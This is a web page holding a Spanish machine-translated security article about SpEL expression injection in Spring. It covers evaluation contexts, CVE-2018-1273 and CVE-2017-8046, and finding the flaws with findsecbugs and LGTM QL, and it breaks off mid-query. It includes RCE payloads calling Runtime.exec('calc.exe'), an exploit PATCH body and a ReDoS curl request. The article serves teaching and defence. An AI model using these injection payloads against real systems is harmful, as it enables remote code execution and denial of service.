<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👲🏿 🎇 🍍 Inyección de hechizo 💹 🐤 👳🏿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Introducción 


 En el proceso de trabajar e investigar varios servicios, podemos cumplir cada vez más con Spring Framework. Y el paso lógico es famil...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Inyección de hechizo</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Introducción </h1><br><p>  En el proceso de trabajar e investigar varios servicios, podemos cumplir cada vez más con Spring Framework.  Y el paso lógico es familiarizarse con su estructura y posibles vulnerabilidades. </p><br><p>  Lo más interesante para cualquier Pentester son las vulnerabilidades que conducen a la ejecución del código. </p><br><p>  Una forma de obtener RCE en Spring es inyectar expresiones SpEL. </p><br><p>  En este artículo intentaremos comprender qué es SpEL, dónde se puede encontrar, cuáles son las características de uso y cómo encontrar tales inyecciones. </p><a name="habracut"></a><br><h1 id="what">  Que? </h1><br><p>  <strong>SpEL</strong> es un lenguaje de expresión creado para Spring Framework que admite consultas y gestión gráfica de objetos en tiempo de ejecución. <br>  También es importante tener en cuenta que SpEL se creó como una API que le permite integrarlo en otras aplicaciones y marcos. </p><br><h1 id="gde-mozhno-vstretit">  ¿Dónde puedo encontrarme? </h1><br><p>  Es lógico que en <strong>Spring Framework</strong> SpEL se use todo el tiempo.  Un buen ejemplo es Spring Security, donde los derechos se asignan mediante expresiones SpEL: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel usa la API SpEL;  A continuación se presentan ejemplos de su documentación. <br>  Formación de letras usando expresiones SpEL: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  O puede usar una regla de un archivo externo, por ejemplo, para especificar un Encabezado: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Aquí hay algunos ejemplos vistos en GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Spring Framework y SpEL Basics </h1><br><p>  Para que sea más fácil para el lector comprender qué son las inyecciones de SpEL, debe conocer Spring y SpEL un poco. </p><br><p>  Un elemento clave del Spring Framework es el Spring Container.  Un contenedor crea objetos, los une, los configura y los gestiona desde la creación hasta la destrucción. </p><br><p>  Para controlar los componentes que componen la aplicación, Spring Container utiliza <br>  Inyección de dependencia.  Esto es cuando los objetos se configuran utilizando entidades externas llamadas Spring Beans, coloquialmente llamadas "beans". </p><br><p>  Spring Container recupera los metadatos de configuración del bean que se necesita para obtener la siguiente información: instrucciones sobre qué objetos instanciar y cómo configurarlos a través de metadatos. </p><br><p>  Los metadatos se pueden obtener de 3 maneras: </p><br><ul><li>  XML </li><li>  Anotaciones Java </li><li>  Código Java </li></ul><br><p>  Y otro punto importante para nosotros es el contexto de la aplicación. </p><br><p>  <strong>ApplicationContext</strong> es la interfaz principal en una aplicación Spring que proporciona información de configuración de la aplicación.  Es de solo lectura en tiempo de ejecución, pero se puede volver a cargar si es necesario y es compatible con la aplicación.  El número de clases que implementan la interfaz ApplicationContext está disponible para varios parámetros de configuración y tipos de aplicaciones.  De hecho, es la aplicación Spring misma.  El contexto también proporciona la capacidad de responder a varios eventos que ocurren dentro de la aplicación y controlar el ciclo de vida de los beans. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Ahora analicemos directamente los métodos para definir un bean y usar expresiones SpEL. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Un ejemplo de uso típico es la integración de SpEL en la creación de XML o definiciones anotadas de componentes de bean: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">“exmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Aquí hay una parte del código en el archivo Bean.xml, para solo uno de sus beans.  Vale la pena prestar atención al id del bin, por el que se puede acceder, y a las propiedades.  Porque  Como parte de este artículo estamos considerando la posibilidad de usar SpEL, luego en el ejemplo se darán varias opciones para escribir tales expresiones. </p><br><p>  Para indicarle a Spring que las expresiones SpEL son las siguientes, se usa el carácter # y la expresión en sí misma se encierra entre llaves: <code>#{SpEL_expression}</code> .  Se puede hacer referencia a las propiedades utilizando el carácter $ y encerrando el nombre de la propiedad entre llaves: <code>${someProperty}</code> .  Los marcadores de posición de propiedad no pueden contener expresiones SpEL, pero las expresiones pueden contener referencias de propiedad: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  Por lo tanto, puede llamar a cualquier clase de Java que necesitemos o, por ejemplo, acceder a variables de entorno, que pueden ser útiles para determinar el nombre de usuario o la versión del sistema. </p><br><p>  La conveniencia de este método de especificar beans es la capacidad de cambiarlos sin volver a compilar toda la aplicación, cambiando así el comportamiento de la aplicación. </p><br><p>  Desde la propia aplicación, puede acceder a este bean utilizando la interfaz ApplicationContext, como se muestra a continuación: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(“Bean.xml”); MyExpression example = ctx.getBean(“example<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(“Number : "</span></span> + example.getValue()); System.out.println(“Locale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(“Locale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  Es decir  dentro de la aplicación, simplemente obtenemos los valores de los parámetros bin que contienen expresiones SpEL.  Spring, después de recibir dicho valor, ejecuta la expresión y devuelve el resultado final.  Además, no olvide que este código no funcionará sin los captadores correspondientes, pero su descripción está fuera del alcance del artículo. </p><br><p>  Otra forma de especificar beans es el método de anotación AnnotationBase: los valores de los parámetros se establecen dentro de la anotación para alguna clase.  En este caso, el uso de variables no es posible. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Para poder usar variables, al crear expresiones SpEL, necesitamos usar la interfaz ExpressionParser.  Y luego aparece una clase en el código de la aplicación, similar al siguiente ejemplo: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser convierte una expresión de cadena en un objeto Expression.  Por lo tanto, el valor de la expresión analizada se puede obtener en el marco del EvaluationContext.  Este EvaluationContext será el único objeto del que estarán disponibles todas las propiedades y variables en la cadena EL. </p><br><p>  Vale la pena señalar otro hecho importante.  Con este método de uso de SpEL, solo necesitamos que la expresión de cadena contenga # si, además de la expresión misma, contiene literales de cadena. </p><br><p>  De todo lo anterior, vale la pena recordar dos cosas: <br>  1) Si es posible buscar por código de aplicación, entonces debe buscar tales palabras clave: SpelExpressionParser, EvaluationContext y parseExpression. <br>  2) Punteros importantes para Spring <code>#{SpEL}</code> , <code>${someProperty}</code> y <code>T(javaclass)</code> <br>  Si desea leer más sobre Spring y SpEL, le recomendamos que preste atención a la documentación de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">docs.spring.io</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  ¿Qué puede hacer SpEL? </h1><br><p>  De acuerdo con la documentación, SpEL admite la siguiente funcionalidad: </p><br><ul><li>  Expresiones literales </li><li>  Operadores booleanos y relacionales </li><li>  Expresiones regulares </li><li>  Expresiones de clase </li><li>  Acceso a propiedades, matrices, listas, mapas </li><li>  Invocación de método </li><li>  Operadores relacionales </li><li>  Cesión </li><li>  Llamando a constructores </li><li>  Referencias de frijoles </li><li>  Construcción de matriz </li><li>  Listas en línea </li><li>  Mapas en línea </li><li>  Operador ternario </li><li>  Variables </li><li>  Funciones definidas por el usuario. </li><li>  Proyección de colección </li><li>  Selección de colección </li><li>  Expresiones con plantilla </li></ul><br><p>  Como podemos ver, la funcionalidad SpEL es muy rica, y esto puede afectar negativamente la seguridad del proyecto si la entrada del usuario entra en ExpressionParser.  Por lo tanto, Spring recomienda utilizar, en lugar de un StandardEcalutionContext completamente funcional, un SimpleEvaluationContext más simple. </p><br><p>  En resumen, de importancia para nosotros, SimpleEvaluationContext no tiene la capacidad de acceder a clases Java y hacer referencia a otros beans. </p><br><p>  Una descripción completa de las características se explora mejor en el sitio web de documentación: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Algunas correcciones se basan incluso en la diferencia en la funcionalidad de SpEL, que se ejecuta en diferentes contextos, pero hablaremos de esto un poco más adelante. </p><br><p>  Para dejar todo realmente claro, damos un ejemplo.  Tenemos una línea claramente maliciosa que contiene una expresión SpEL: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  Y hay dos contextos: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  y </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Expresión exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>se lanzará la calculadora</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>recibiremos un mensaje de error</strong> </p><br><p>  Un punto igualmente interesante es que podemos comenzar a procesar la expresión sin especificar ningún contexto: <code>exp.getValue();</code> <br>  En este caso, la expresión se ejecutará dentro del contexto estándar y, como resultado, se ejecutará el código malicioso.  Por lo tanto, si usted es un programador y usa Spring, nunca olvide establecer el contexto dentro del cual debe ejecutarse la expresión. </p><br><p>  Dijimos un poco antes que algunas correcciones se basan en las diferencias entre las capacidades de SpEL dentro de los contextos.  Considere un ejemplo de tal solución. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Esta vulnerabilidad se encontró en el método setPropertyValue y se basó en dos problemas: <br>  1) Saneamiento insuficiente de los valores de la variable que cae en ExpressionParser. <br>  2) Ejecución de la expresión en el marco del contexto estándar. </p><br><p>  Aquí hay una captura de pantalla de la parte vulnerable del código: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Porque  el nombre de la propiedad no requirió un procesamiento complejo dentro del marco de SpEL; la solución lógica fue reemplazar el contexto, dando como resultado el siguiente código: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  Las capturas de pantalla muestran las partes del código que establecen el contexto y la expresión que se ejecutará.  Pero la ejecución de la expresión ocurre en otra parte: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  Es aquí donde se indica que estamos ejecutando una expresión SpEL para el valor del valor dentro del contexto dado. <br>  El uso de SimpleEvaluationContext ayudó a proteger contra la implementación de Java Class en parseExpression, y ahora, en lugar de ejecutar código en el registro del servidor, veremos un error: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Pero esto no resolvió el problema con la falta de saneamiento suficiente y retuvo la capacidad de realizar un ataque redos: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Por lo tanto, la siguiente corrección ya incluía desinfectar el nombre del parámetro. </p><br><h1 id="ot-teorii-k-praktike">  ¡De la teoría a la práctica! </h1><br><p>  Ahora echemos un vistazo a varias formas de buscar la inyección de SpEL utilizando el método de White Box. </p><br><h2 id="step-by-step-cve-2017-8046">  Paso a paso CVE-2017-8046 </h2><br><p>  Primero necesita encontrar un lugar para procesar expresiones SpEL.  Para hacer esto, simplemente puede usar nuestra recomendación y encontrar palabras clave en el código.  Recuerde estas palabras: SpelExpressionParser, EvaluationContext y parseExpression. </p><br><p>  Otra opción es usar varios complementos para encontrar errores en el código.  Hasta ahora, el único complemento que apunta a una posible inyección de SpEL era findsecbugs-cli. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Entonces, encontramos el lugar que nos interesa en el código.  Digamos que usa findsecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  En el código de la aplicación, veremos lo siguiente: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  El siguiente paso es descubrir dónde entra la variable de ruta en el analizador de expresiones.  Una de las formas más prácticas y gratuitas sería utilizar la función IntelijIdea IDE - Analizar flujo de datos: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  Al desenrollar la cadena, por ejemplo, para reemplazar y estudiar los métodos y clases especificados, obtenemos lo siguiente: </p><br><p>  El método ReplaceOperation toma el valor de la variable de ruta. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  Y para llamar al método de reemplazo, debe pasar la variable "op" con el valor "reemplazar" a JSON. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  Del mismo modo, encontramos todos los lugares donde el usuario puede pasar el valor que necesita a la variable de ruta.  Y luego una de las opciones de explotación para la vulnerabilidad se verá así: <br>  Método de solicitud: PARCHE <br>  Cuerpo de solicitud: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Usando LGTM QL </h2><br><p>  Usar LGTM QL (para los fines de este artículo, simplemente lo reducimos a QL) es otra forma interesante de buscar vulnerabilidades. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">https://lgtm.com</a> </p><br><p>  Debe estipular inmediatamente su falta.  De forma gratuita, puede analizar solo proyectos que están en repositorios abiertos en GitHub, porque  Para tomar una foto del proyecto, LGTM carga el proyecto en su servidor y lo compila allí.  Pero si esto no le molesta, entonces el LGTM QL le abrirá grandes oportunidades para analizar el código de la aplicación. </p><br><p>  Entonces, ¿qué es el análisis de aplicaciones QL? </p><br><p>  Para comenzar, como ya dijimos, debe crear una instantánea de la aplicación. </p><br><p>  Cuando la instantánea está lista, y esto puede llevar varias horas, puede comenzar a escribir una consulta similar a SQL como parte de la sintaxis QL.  Para hacer esto, puede usar el complemento para Eclipse o actuar directamente en la consola en la página QL del proyecto. </p><br><p>  Porque  Ahora estamos considerando Spring, y este es el marco para Java, tendrá que describir la clase de interés para usted y el método de esta clase, cuya llamada se considera vulnerable.  Para nosotros, esta es cualquier clase que contiene un método que llama a ExpressionParser. </p><br><p>  Luego hacemos una selección de todos los métodos que cumplen con nuestros requisitos, por ejemplo, describiendo cómo una variable cae en un método que se desinfectaría y la condición de no caer en este método. </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Entonces, ¿qué se debe hacer para encontrar la vulnerabilidad CVE 2018-1273? <br>  Una vez recibida y conectada la imagen del proyecto, usamos la consola QL para describir el árbol de llamadas que nos interesa.  Para hacer esto: <br>  Describimos la clase del analizador de expresiones: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  Y los métodos que se pueden usar para la ejecución dentro de la clase ExpressionParser: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or 